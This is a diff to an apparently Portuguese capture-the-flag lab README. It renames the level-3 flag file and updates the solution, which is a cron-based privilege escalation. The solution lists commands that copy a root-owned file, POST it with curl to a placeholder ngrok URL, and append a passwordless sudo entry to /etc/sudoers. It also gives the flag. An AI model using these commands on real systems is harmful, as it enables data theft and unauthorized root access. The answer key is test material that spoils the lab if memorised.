@@ -15,7 +15,7 @@ Ao obter a conexão, será exibido um BANNER de login com algumas instruções e
 
 ## nivel 3
 Este nível, é o mais difícil e aqui está como finalização, após este o comprometimento da máquina se dá por completo.
-A pessoa que estiver jogando, será convidada a ler o conteúdo do arquivo /root/flag.txt.
+A pessoa que estiver jogando, será convidada a ler o conteúdo do arquivo /root/flag.
 Para isso, será necessário realizar um privilege escalation através de uma tarefa cron.
 Com isso, será demonstrado que, é possível ler uma tabela cron e saber se existem scripts desprotegidos e sendo executados como root.
 
@@ -102,10 +102,10 @@ FLAG: L3CTF{y34h_y34h_g0t_th3_k3ys_n0t_th3_ch33s3_th3_k3ys}
 
 ### Nivel 3
 Uma das possíveis soluções é, criar um arquivo `log.sh`, na home do temp_user para que faça um :
-- cat /root/flag/txt > /home/temp_user/flag.txt && chmod 777 /home/temp_user/flag.txt 
-- curl -X POST --data-binary @/root/flag.txt [URL_DO_NGROK] 
+- cat /root/flag > /home/temp_user/flag.txt && chmod 777 /home/temp_user/flag.txt 
+- curl -X POST --data-binary @/root/flag [URL_DO_NGROK] 
 - echo "temp_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
-Qualquer uma destas soluções habilita a leitura do arquivo /root/flag.txt
+Qualquer uma destas soluções habilita a leitura do arquivo /root/flag
 O arquivo log.sh pode ser descoberto através de um cat em /etc/crontab
 
 FLAG: L3CTF{y34h_y34h_g0t_th3_k3ys_n0t_th3_ch33s3_th3_k3ys}
